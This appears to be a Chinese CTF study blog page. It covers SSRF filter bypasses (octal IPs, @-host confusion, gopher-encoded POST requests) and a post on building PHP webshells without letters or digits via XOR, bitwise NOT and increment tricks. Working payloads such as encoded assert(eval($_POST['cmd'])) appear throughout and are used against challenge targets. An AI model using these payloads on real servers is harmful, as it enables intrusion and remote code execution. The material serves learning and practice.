class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB32b34c9432c7be8652d14b6bf875923d?method=download&shareKey=bb716a00f915f6382ed6796e2eabc8f1"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6ef96bec6797f3f054f6027b9353f257?method=download&shareKey=f4753d617422987700ffdc7dd4396d46"></p>
<p>输入127.0.0.1被die掉，换成localhost就绕过了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;3.php?a&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x3D;&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;3.php?a&#x3D;http:&#x2F;&#x2F;localhost</span><br></pre></td></tr></table></figure>

<h3 id="特殊IP"><a href="#特殊IP" class="headerlink" title="特殊IP"></a>特殊IP</h3><p>也可以将127.0.0.1进行进制转换，同样可以绕过限制</p>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;3.php?a&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x3D;&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;3.php?a&#x3D;http:&#x2F;&#x2F;017700000001</span><br><span class="line">  &#x2F;&#x2F;127.0.0.1转换为八进制即为017700000001</span><br></pre></td></tr></table></figure>

<h2 id="解析URL绕过"><a href="#解析URL绕过" class="headerlink" title="解析URL绕过"></a>解析URL绕过</h2><p>当后端进行不正确的正则匹配时，我们可以通过构造来绕过限制</p>
<p>例如限制127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com@127.0.0.1&#x2F;</span><br></pre></td></tr></table></figure>

<p>这是会被认为host为<code>www.baidu.com</code>,而实际上我们访问的时127.0.0.1，这样我们就绕过了。</p>
<h2 id="不存在协议头绕过"><a href="#不存在协议头绕过" class="headerlink" title="不存在协议头绕过"></a>不存在协议头绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^http/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当PHP的 <code>file_get_contents()</code> 在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1?a&#x3D;httpabc:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br><span class="line">&#x2F;&#x2F;这里http匹配到正则，而php识别不了httpabc，就会当成一个目录</span><br></pre></td></tr></table></figure>

<h2 id="get-headers-绕过"><a href="#get-headers-绕过" class="headerlink" title="get_headers 绕过"></a>get_headers 绕过</h2><p>如果题目源码中存在<code>get_headers</code>这个函数，那就可以用%00截断来绕过</p>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.xxx.xxx.xxx&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%00www.google.com</span><br></pre></td></tr></table></figure>

<h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>如果127.0.0.1ban掉，可以用<code>xip.io</code>这个网址，当访问这个服务的任意子域名的时候，都会重定向到这个子域名</p>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;1.php 实际上访问的是http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p>也可以通过短地址跳转绕过</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://4m.cn/">https://4m.cn/</a></p>
</blockquote>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><ul>
<li><p>题目要求</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBda1eece2313465ea7eb93f451fde728d?method=download&shareKey=1c33c92140b8d8b955259d74bcb26234"></p>
</li>
<li><p>按要求拿到flag</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB99e2748672073557656bd9aef62a8472?method=download&shareKey=0a19fc6b12fc82d3eb20b81fab47965f"></p>
</li>
</ul>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><ul>
<li><p>题目要求<code>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB517d5968147422997353b9ab5367d537?method=download&shareKey=a9a6f6782194a11ccd453b41cd857643"></p>
</li>
</ul>
<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>这道题要求是用post请求</p>
<p>访问flag.php得到key</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBdc3a0ac5dd04f4f4f5480673861c87a9?method=download&shareKey=752d1737a0127dbcfbf2157f5927f0ef"></p>
<p>在kawhi师兄blog学习解法，用师兄的脚本编码,记得加上key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /1.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.0.102</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a=world</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>然后在前面手动加上gopher协议头和IP:端口 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%20&#x2F;flag.php%20HTTP&#x2F;1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application&#x2F;x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0Akey%3Df108a650e04da918cd7064498735eafc%0D%0A%0D%0Aa%3Dworld%0D%0A</span><br></pre></td></tr></table></figure>

<p>用bp得到flag</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBbd752b906304d31f851794f6e26edfc1?method=download&shareKey=da37994993e46b9205f0e87d8a126daa"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/30/%E6%97%A0%E5%AD%97%E7%AC%A6webshell/">无字符webshell</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-30</time><div class="content"><p>有时候题目会对传进去参数中的数字字母进行过滤，导致传参失败，因此我们要在没有字母数字的情况下构造webshell。</p>
<p>参考</p>
<blockquote>
<p> <a target="_blank" rel="noopener" href="https://www.getflag.cn/2020/07/18/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0webshell/">无字符构造webshell | kawhi’s Blog (getflag.cn)</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a> </p>
</blockquote>
<h1 id="无字符绕过"><a href="#无字符绕过" class="headerlink" title="无字符绕过"></a>无字符绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>上面这段代码就通过正则匹配将字母和数字过滤，因此我们需要将字母数字通过其他方式表达</strong></p>
<p>在 php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。 </p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB906815a7ca39e055e42fcb115c51fadc?method=download&shareKey=eede409a7cd9066bc93e7f2f34d2cd9f"></p>
<h2 id="方法一（异或）"><a href="#方法一（异或）" class="headerlink" title="方法一（异或）"></a>方法一（异或）</h2><p>什么是异或，异或是一种运算符，符号为<code>^</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="number">1</span>;  <span class="comment">//1的二进制数为00000001</span></span><br><span class="line">$n = <span class="number">2</span>;  <span class="comment">//2的二进制数为00000010</span></span><br><span class="line">$mn = $m ^ $n;  <span class="comment">//按位异或相同为0，不同为1，则结果为00000011</span></span><br><span class="line"><span class="keyword">echo</span> $mn;  <span class="comment">//输出结果为3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>按照同样原理我们可以通过异或来构造字母数字，从而的得到我们想要的函数。</p>
<p>这里是师兄给的一段代码，可以计算异或的可见结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB507feb4d17e32041dc248c28bba5182e?method=download&shareKey=f65082c1c2efed3440353b52673b501e"></p>
<p>我们可以尝试构造_GET</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);  <span class="comment">//%ff^%a0=_;%ff^%b8=G;</span></span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);  <span class="comment">//%ff^%ba=E;%ff^%ab=T;</span></span><br><span class="line"><span class="keyword">echo</span> $a^$b;  <span class="comment">//输出_GET</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBd5af391ca0f249c2ebcd9183d1918625?method=download&shareKey=a38c63d568b0bb4f22a69c61549e71c0"></p>
<p>同样的可以用这个方法构造phpinfo()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo  <span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcbc2fc020e409ead3f8be95214bf86cb?method=download&shareKey=00e7462c99fd0a35771eaf4365cabbd0"></p>
<p>尝试构造webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br></pre></td></tr></table></figure>

<p>构造出<code>$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27cmd%27])</code>，连下蚁剑</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB56c62fd5cf6fb2794d527448503ba137?method=download&shareKey=4e07b736dc452941a566d762ca6e68cd"></p>
<h2 id="方法二（取反）"><a href="#方法二（取反）" class="headerlink" title="方法二（取反）"></a>方法二（取反）</h2><p>同样的什么是取反，取反也是一种运算符，符号为<code>~</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$m = <span class="number">2</span>;  <span class="comment">//2的原码为00000010</span></span><br><span class="line">$n = ~$m;  <span class="comment">//取反后为11111101，由于1为符号为，则为负数，按以其正值的补码形式表示为10000011</span></span><br><span class="line"><span class="keyword">echo</span> $n;  <span class="comment">//则输出-3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单理解就是按位把1变成0，把0变成1。同样尝试构造phpinfo()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;  <span class="comment">//输出%8F%97%8F%96%91%99%90，phpinfo()即(~%8F%97%8F%96%91%99%90)();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但传参并无反应</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf825ada8b16d6114e3094c76ad4a90fa?method=download&shareKey=e079aa97ce13c7f681bb910f4510e6cd"></p>
<p>换成<strong>php7</strong>成功，<strong>php5</strong>应该不支持这种方式</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf0bd8deeb0429fbc0b0d85e98bad88b2?method=download&shareKey=27c4e7af39a03308adee74b30e281d8a"></p>
<p>同样试着构造webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);  <span class="comment">//输出%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[cmd]))&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$c);   <span class="comment">//输出%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>assert(eval($_POST[cmd]))</code>即<code>(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6)</code>,用蚁剑连</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB324adb0d7d1a28298047904bda630d0d?method=download&shareKey=ed22308773407dcaecfe48b8558a81a1"></p>
<p>连不上，看师兄教案用<strong>php7.0</strong>试一下，成功</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB69291c7de06a103bab2153defaaedbab?method=download&shareKey=79e27bb1d29c72e89d5863617c352099"></p>
<h2 id="方法三（自增）"><a href="#方法三（自增）" class="headerlink" title="方法三（自增）"></a>方法三（自增）</h2><blockquote>
<p> 在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>，而在 C 中，<code>a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 </p>
</blockquote>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBca3d95101544d4a901757254d76b52c8?method=download&shareKey=3bf2b744fd6259ba7bb6d8058c12086c"></p>
<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>： </p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5c7ae791e223029c807d7349b5c442b0?method=download&shareKey=9930c5dce15e972109417b111a6b9596"></p>
<p>则可以构造webshell，php对大小写不敏感</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;  <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];  <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_;  <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__;  <span class="comment">// S</span></span><br><span class="line">$___.=$__;  <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;  <span class="comment">// E</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]);  <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>将<code>+</code>URL编码后传参</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa7a1cd941f80e61c1912dcd721aa5ab4?method=download&shareKey=273bdb5d65efbd7dfe9b6026865b8a52"></p>
<p><strong>ps:第三种方法虽然可行，但构造起来比前两周麻烦很多</strong></p>
<h2 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><ul>
<li><p>题目源码，通过正则匹配把很多字符都过滤了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li><p>用脚本跑出可用字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allow = [];</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">255</span>; $i++)&#123;</span><br><span class="line">    $string =chr($i);</span><br><span class="line">    <span class="keyword">if</span> ( !preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $string))&#123;</span><br><span class="line">        $allow[$i]=$string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($allow);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBdfc7239d8654e6f3271b86f2d2762bfe?method=download&shareKey=51fc49842f489e1def94e36f7f47950e"></p>
</li>
<li><p>看一下php版本，确定用异或绕过</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBfd5c0b072ad3a02b9445e529fcac9e59?method=download&shareKey=aa94fdd7053231badc372e8f8696c901"></p>
</li>
<li><p>构造webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%f1&#125;($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%f2&#125;);&amp;%f1=assert&amp;%f2=<span class="keyword">eval</span>($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%f1&#125;($&#123;_GET&#125;&#123;%f2&#125;);&amp;%f1=assert&amp;%f2=eval($_POST[%27cmd%27])</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>蚁剑连接成功，拿到flag</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb64562fac3543b642017004e9679f37f?method=download&shareKey=78cbe1f5ed448a7e7629204bd16dde3c"></p>
</li>
</ul>
<h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><ul>
<li><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">              <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>同样用脚本跑可用字符,<code>^</code>被过滤，只能用<code>~</code>取反绕过</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa1ab53320caba223a54c5567d81094f2?method=download&shareKey=edf7602edf349e413dd72c41367efa44"></p>
</li>
<li><p>php7,可以用取反</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc557b8f55a8b64c55bc664444e3b98c5?method=download&shareKey=ad3abecc8d4e23b1ee282450ad696e91"></p>
</li>
<li><p>构造webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">9</span>C%<span class="number">92</span>%<span class="number">9</span>B%A2%D6%D6)</span><br></pre></td></tr></table></figure>
</li>
<li><p>蚁剑连接成功，拿到flag</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBefebac20a3f8a7655f5944318f518db9?method=download&shareKey=277ce2cbc73c7cbe4d642a0766fd6eb5"></p>
</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/20/%E6%B5%B7%E5%95%B8%E6%9D%AFwriteup/">海啸杯writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-20</time><div class="content"><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h2><ul>
<li><p>图片一看长和宽比例就不太对<br><img src="https://note.youdao.com/yws/api/personal/file/WEBb5aa0929994ab05abbbc7fc426dcf855?method=download&shareKey=136092033ea6928ee0a371d2ae6a26bd"></p>
</li>
